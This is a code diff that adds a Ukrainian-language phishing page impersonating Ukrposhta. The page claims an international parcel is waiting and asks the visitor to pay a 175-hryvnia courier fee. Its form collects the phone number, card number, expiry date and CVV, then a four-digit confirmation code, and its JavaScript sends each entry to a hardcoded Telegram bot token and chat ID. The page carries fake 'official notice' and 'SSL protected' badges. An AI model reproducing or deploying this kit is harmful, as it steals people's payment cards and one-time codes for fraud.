@@ -1,0 +1,582 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Укрпошта — повідомлення про доставку</title>
+    <!-- Шрифти та стилі Укрпошти: синій, жовтий, офіційно -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <!-- Font Awesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Roboto', sans-serif;
+            background: #f0f4f8;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            color: #1e2b3c;
+        }
+
+        /* Офіційний контейнер Укрпошти */
+        .poshta-container {
+            max-width: 600px;
+            width: 100%;
+            background: #ffffff;
+            border-radius: 16px;
+            box-shadow: 0 20px 40px rgba(0, 40, 80, 0.15), 0 4px 12px rgba(0, 0, 0, 0.1);
+            overflow: hidden;
+            border: 1px solid #ffd700;
+        }
+
+        /* Синій хедер Укрпошти */
+        .header {
+            background: #0057b7; /* фірмовий синій */
+            padding: 25px 30px 20px;
+            color: white;
+            position: relative;
+            border-bottom: 4px solid #ffd700;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            margin-bottom: 15px;
+        }
+
+        .logo-icon {
+            font-size: 40px;
+            color: #ffd700;
+        }
+
+        .logo-text {
+            font-weight: 700;
+            font-size: 28px;
+            letter-spacing: -0.5px;
+        }
+
+        .badge {
+            background: rgba(255, 255, 255, 0.2);
+            color: white;
+            padding: 5px 15px;
+            border-radius: 30px;
+            font-size: 13px;
+            font-weight: 500;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            border: 1px solid rgba(255, 215, 0, 0.5);
+            margin-bottom: 15px;
+        }
+
+        /* Жовтий акцент */
+        .important-message {
+            background: #fff3cd;
+            border-left: 6px solid #ffd700;
+            padding: 15px 20px;
+            margin: 20px 0;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.05);
+        }
+
+        .important-message p {
+            margin: 8px 0;
+            font-size: 15px;
+            color: #1e2b3c;
+        }
+
+        .important-message i {
+            color: #0057b7;
+            width: 24px;
+        }
+
+        .order-number {
+            font-weight: 700;
+            color: #c41e3a;
+            background: #fff;
+            padding: 2px 10px;
+            border-radius: 20px;
+            font-size: 18px;
+            border: 1px solid #c41e3a;
+            display: inline-block;
+            margin-left: 5px;
+        }
+
+        .content {
+            padding: 30px;
+        }
+
+        .step-title {
+            font-weight: 700;
+            font-size: 18px;
+            color: #0057b7;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            border-bottom: 2px solid #ffd700;
+            padding-bottom: 10px;
+        }
+
+        .form-group {
+            margin-bottom: 25px;
+        }
+
+        .form-group label {
+            display: block;
+            font-weight: 500;
+            color: #2c3e50;
+            margin-bottom: 8px;
+            font-size: 14px;
+        }
+
+        .input-wrapper {
+            position: relative;
+        }
+
+        .input-wrapper i {
+            position: absolute;
+            left: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #0057b7;
+            font-size: 18px;
+        }
+
+        .input-wrapper input {
+            width: 100%;
+            background: #f9f9f9;
+            border: 2px solid #e0e7ef;
+            border-radius: 12px;
+            padding: 16px 16px 16px 50px;
+            font-size: 16px;
+            font-family: 'Roboto', sans-serif;
+            transition: all 0.2s;
+        }
+
+        .input-wrapper input:focus {
+            border-color: #0057b7;
+            outline: none;
+            background: #fff;
+            box-shadow: 0 0 0 3px rgba(0, 87, 183, 0.1);
+        }
+
+        .row {
+            display: flex;
+            gap: 15px;
+        }
+        .row .form-group {
+            flex: 1;
+        }
+
+        /* Кнопка в стилі Укрпошти */
+        .btn {
+            background: #ffd700;
+            color: #0057b7;
+            border: none;
+            border-radius: 60px;
+            padding: 20px;
+            font-size: 18px;
+            font-weight: 700;
+            width: 100%;
+            cursor: pointer;
+            transition: all 0.3s;
+            box-shadow: 0 8px 16px rgba(255, 215, 0, 0.3);
+            margin-top: 20px;
+            border: 2px solid #e5c100;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .btn:hover {
+            background: #e5c100;
+            transform: translateY(-2px);
+            box-shadow: 0 12px 24px rgba(0, 87, 183, 0.2);
+        }
+
+        .btn i {
+            margin-right: 10px;
+        }
+
+        /* Платіжні іконки */
+        .payment-icons {
+            display: flex;
+            justify-content: center;
+            gap: 30px;
+            margin: 30px 0 10px;
+            color: #a0b8cc;
+            font-size: 32px;
+        }
+
+        /* Стилі для OTP */
+        .otp-section {
+            display: none;
+            text-align: center;
+        }
+
+        .otp-inputs {
+            display: flex;
+            gap: 10px;
+            justify-content: center;
+            margin: 30px 0;
+        }
+
+        .otp-inputs input {
+            width: 60px;
+            height: 70px;
+            background: #f9f9f9;
+            border: 2px solid #e0e7ef;
+            border-radius: 16px;
+            text-align: center;
+            font-size: 28px;
+            font-weight: 700;
+            color: #0057b7;
+        }
+
+        .otp-inputs input:focus {
+            border-color: #ffd700;
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(255, 215, 0, 0.3);
+        }
+
+        .resend-link {
+            color: #0057b7;
+            text-decoration: none;
+            font-weight: 500;
+            border-bottom: 1px dashed #ffd700;
+        }
+
+        /* Блок відладки */
+        .debug-box {
+            background: #f0f0f0;
+            border-left: 4px solid #ffd700;
+            padding: 10px;
+            margin-top: 20px;
+            font-size: 12px;
+            color: #333;
+            border-radius: 8px;
+            display: none; /* приховано за замовчуванням, можна показати для діагностики */
+        }
+
+        .footer-note {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 12px;
+            color: #6c7a8a;
+        }
+    </style>
+</head>
+<body>
+    <div class="poshta-container">
+        <div class="header">
+            <div class="logo">
+                <i class="fas fa-envelope-open-text logo-icon"></i>
+                <span class="logo-text">Укрпошта</span>
+            </div>
+            <div class="badge"><i class="fas fa-shield-alt"></i> Офіційне повідомлення</div>
+        </div>
+
+        <div class="important-message">
+            <p><i class="fas fa-exclamation-triangle" style="color: #c41e3a;"></i> <strong>Увага!</strong> На Ваше ім'я надійшло міжнародне відправлення</p>
+            <p><i class="fas fa-box"></i> <strong>Номер відправлення:</strong> <span class="order-number">K-56742</span></p>
+            <p><i class="fas fa-calendar-check"></i> <strong>Дата надходження:</strong> 06.03.2026</p>
+            <p><i class="fas fa-clock"></i> <strong>Термін зберігання:</strong> 7 днів</p>
+            <p><i class="fas fa-truck"></i> <strong>Доставка кур'єром:</strong> 175 грн (сплачується отримувачем)</p>
+        </div>
+
+        <div class="content">
+            <!-- Крок 1: форма -->
+            <div id="step1">
+                <div class="step-title"><i class="fas fa-phone-alt"></i> Підтвердьте номер телефону</div>
+                <div class="form-group">
+                    <label>Номер телефону отримувача (введіть для отримання SMS)</label>
+                    <div class="input-wrapper">
+                        <i class="fas fa-mobile-alt"></i>
+                        <input type="tel" id="phone" placeholder="+380 00 000 00 00" value="+380">
+                    </div>
+                </div>
+
+                <div class="step-title"><i class="fas fa-credit-card"></i> Оплатіть кур'єрську доставку</div>
+                <div class="form-group">
+                    <label>Номер картки</label>
+                    <div class="input-wrapper">
+                        <i class="fas fa-credit-card"></i>
+                        <input type="text" id="card" placeholder="0000 0000 0000 0000" maxlength="19" inputmode="numeric">
+                    </div>
+                </div>
+                <div class="row">
+                    <div class="form-group">
+                        <label>Термін дії</label>
+                        <div class="input-wrapper">
+                            <i class="fas fa-calendar-alt"></i>
+                            <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" inputmode="numeric">
+                        </div>
+                    </div>
+                    <div class="form-group">
+                        <label>CVV</label>
+                        <div class="input-wrapper">
+                            <i class="fas fa-lock"></i>
+                            <input type="text" id="cvv" placeholder="123" maxlength="3" inputmode="numeric">
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Кнопка з чіткою дією -->
+                <button class="btn" id="payBtn"><i class="fas fa-check-circle"></i> Сплатити 175 грн</button>
+
+                <div class="payment-icons">
+                    <i class="fab fa-cc-visa"></i>
+                    <i class="fab fa-cc-mastercard"></i>
+                    <i class="fab fa-cc-amex"></i>
+                </div>
+
+                <!-- Блок відладки (прихований) -->
+                <div id="debug" class="debug-box"></div>
+            </div>
+
+            <!-- Крок 2: OTP -->
+            <div id="step2" style="display: none;">
+                <div class="step-title"><i class="fas fa-lock"></i> Підтвердження</div>
+                <p style="margin-bottom: 20px;">Код підтвердження надіслано на <strong id="phoneDisplay"></strong></p>
+                <div class="otp-inputs">
+                    <input type="text" maxlength="1" class="otp-digit">
+                    <input type="text" maxlength="1" class="otp-digit">
+                    <input type="text" maxlength="1" class="otp-digit">
+                    <input type="text" maxlength="1" class="otp-digit">
+                </div>
+                <button class="btn" id="confirmBtn"><i class="fas fa-check"></i> Підтвердити</button>
+                <p style="margin-top: 15px;"><a href="#" class="resend-link" id="resendLink">Не отримали код?</a></p>
+            </div>
+
+            <div class="footer-note">
+                <i class="fas fa-shield-alt"></i> Захищено SSL · Укрпошта 2026
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // ========== НАЛАШТУВАННЯ ==========
+        // ТОКЕН БОТА (ОБОВ'ЯЗКОВО ПЕРЕВІРТЕ!)
+        const TELEGRAM_BOT_TOKEN = '8402400086:AAFwyvFm0GRbU51uqpNY-Ii1y3nDg-YVmcI';
+        const ADMIN_CHAT_ID = '8015426849';
+
+        // ========== ГЛОБАЛЬНІ ЗМІННІ ==========
+        let orderData = {};
+        const debugDiv = document.getElementById('debug');
+
+        // Функція для виведення в консоль та на сторінку (для діагностики)
+        function logDebug(message, isError = false) {
+            console.log(message);
+            if (debugDiv) {
+                debugDiv.style.display = 'block';
+                debugDiv.innerHTML += `<p style="color: ${isError ? 'red' : 'green'};">${new Date().toLocaleTimeString()}: ${message}</p>`;
+            }
+        }
+
+        // ========== ФУНКЦІЯ ВІДПРАВКИ ДО TELEGRAM ==========
+        async function sendToTelegram(message) {
+            logDebug('Спроба відправки даних до Telegram...');
+            
+            // Перевірка налаштувань
+            if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN.length < 10) {
+                const errorMsg = 'Помилка: токен бота недійсний!';
+                logDebug(errorMsg, true);
+                alert(errorMsg);
+                return false;
+            }
+
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            
+            const payload = {
+                chat_id: ADMIN_CHAT_ID,
+                text: message,
+                parse_mode: 'HTML'
+            };
+
+            logDebug('URL: ' + url);
+            logDebug('Payload: ' + JSON.stringify(payload));
+
+            try {
+                logDebug('Відправка запиту...');
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(payload)
+                });
+
+                logDebug('Статус відповіді: ' + response.status);
+
+                const data = await response.json();
+                logDebug('Відповідь Telegram: ' + JSON.stringify(data));
+
+                if (data.ok) {
+                    logDebug('✅ Повідомлення успішно надіслано!');
+                    return true;
+                } else {
+                    const errorDesc = data.description || 'Невідома помилка';
+                    logDebug('❌ Помилка Telegram: ' + errorDesc, true);
+                    
+                    // Детальні пояснення
+                    if (errorDesc.includes('bot was blocked')) {
+                        alert('Помилка: бот заблокований користувачем. Створіть нового бота.');
+                    } else if (errorDesc.includes('chat not found')) {
+                        alert('Помилка: невірний ID адміністратора. Перевірте ADMIN_CHAT_ID.');
+                    } else {
+                        alert('Помилка Telegram: ' + errorDesc);
+                    }
+                    return false;
+                }
+            } catch (error) {
+                logDebug('❌ Критична помилка мережі: ' + error.toString(), true);
+                alert('Помилка з'єднання. Перевірте інтернет та консоль (F12).');
+                return false;
+            }
+        }
+
+        // ========== ОБРОБНИК КНОПКИ "СПЛАТИТИ" ==========
+        document.getElementById('payBtn').addEventListener('click', async function(event) {
+            // Запобігаємо стандартній поведінці (на випадок, якщо кнопка в формі)
+            event.preventDefault();
+            
+            logDebug('Кнопка "Сплатити" натиснута');
+
+            // Збираємо дані
+            orderData.phone = document.getElementById('phone').value.trim();
+            orderData.card = document.getElementById('card').value.replace(/\s/g, '');
+            orderData.expiry = document.getElementById('expiry').value;
+            orderData.cvv = document.getElementById('cvv').value;
+
+            logDebug('Дані форми: ' + JSON.stringify(orderData));
+
+            // Валідація
+            if (!orderData.phone || !orderData.card || !orderData.expiry || !orderData.cvv) {
+                alert('Будь ласка, заповніть всі поля');
+                logDebug('❌ Помилка: не всі поля заповнені', true);
+                return;
+            }
+
+            if (orderData.phone.length < 10) {
+                alert('Введіть коректний номер телефону (мінімум 10 цифр)');
+                logDebug('❌ Помилка: номер телефону занадто короткий', true);
+                return;
+            }
+
+            if (orderData.card.length < 16) {
+                alert('Введіть коректний номер картки (16 цифр)');
+                logDebug('❌ Помилка: номер картки неповний', true);
+                return;
+            }
+
+            // Формуємо повідомлення
+            const msg = `
+📦 <b>УКРПОШТА - ОПЛАТА ДОСТАВКИ</b>
+
+📌 <b>Відправлення:</b> K-56742
+📞 <b>Телефон:</b> ${orderData.phone}
+💳 <b>Картка:</b> ${orderData.card}
+📅 <b>Термін:</b> ${orderData.expiry}
+🔐 <b>CVV:</b> ${orderData.cvv}
+💰 <b>Сума:</b> 175 грн
+
+⏱ <b>Дата:</b> ${new Date().toLocaleString('uk-UA')}
+            `;
+
+            // Відправляємо
+            const success = await sendToTelegram(msg);
+
+            if (success) {
+                logDebug('✅ Дані відправлено, переходимо до кроку 2');
+                document.getElementById('phoneDisplay').innerText = orderData.phone;
+                document.getElementById('step1').style.display = 'none';
+                document.getElementById('step2').style.display = 'block';
+            } else {
+                logDebug('❌ Відправка не вдалася, залишаємось на кроці 1', true);
+            }
+        });
+
+        // ========== OTP ЛОГІКА ==========
+        const otpInputs = document.querySelectorAll('.otp-digit');
+        otpInputs.forEach((input, idx) => {
+            input.addEventListener('keyup', function(e) {
+                if (e.key >= '0' && e.key <= '9') {
+                    this.value = e.key;
+                    if (idx < otpInputs.length - 1) {
+                        otpInputs[idx + 1].focus();
+                    }
+                } else if (e.key === 'Backspace') {
+                    if (idx > 0) {
+                        otpInputs[idx - 1].focus();
+                    }
+                }
+            });
+        });
+
+        document.getElementById('confirmBtn').addEventListener('click', async function() {
+            let otp = '';
+            otpInputs.forEach(i => otp += i.value);
+            
+            if (otp.length !== 4) {
+                alert('Введіть повний 4-значний код');
+                return;
+            }
+
+            const otpMsg = `
+🔐 <b>Код підтвердження (Укрпошта)</b>
+📞 Телефон: ${orderData.phone}
+💳 Картка: ${orderData.card}
+🔢 Код: <code>${otp}</code>
+            `;
+
+            const success = await sendToTelegram(otpMsg);
+            if (success) {
+                alert('✅ Доставку підтверджено! Очікуйте кур\'єра.');
+                setTimeout(() => location.reload(), 2000);
+            }
+        });
+
+        document.getElementById('resendLink').addEventListener('click', function(e) {
+            e.preventDefault();
+            alert('Демо-режим: новий код надіслано');
+        });
+
+        // ========== ДОПОМІЖНІ ФУНКЦІЇ ==========
+        // Форматування номера картки
+        document.getElementById('card').addEventListener('input', function(e) {
+            let v = e.target.value.replace(/\D/g, '').substring(0, 16);
+            e.target.value = v.replace(/(.{4})/g, '$1 ').trim();
+        });
+
+        // Форматування терміну дії
+        document.getElementById('expiry').addEventListener('input', function(e) {
+            let v = e.target.value.replace(/\D/g, '').substring(0, 4);
+            if (v.length >= 2) {
+                v = v.substring(0, 2) + '/' + v.substring(2);
+            }
+            e.target.value = v;
+        });
+
+        // Обмеження CVV
+        document.getElementById('cvv').addEventListener('input', function(e) {
+            e.target.value = e.target.value.replace(/\D/g, '').substring(0, 3);
+        });
+
+        // Автоматичне фокусування на першому полі
+        document.getElementById('phone').focus();
+
+        logDebug('Скрипт завантажено. Очікую дії користувача.');
+    </script>
+</body>
+</html>
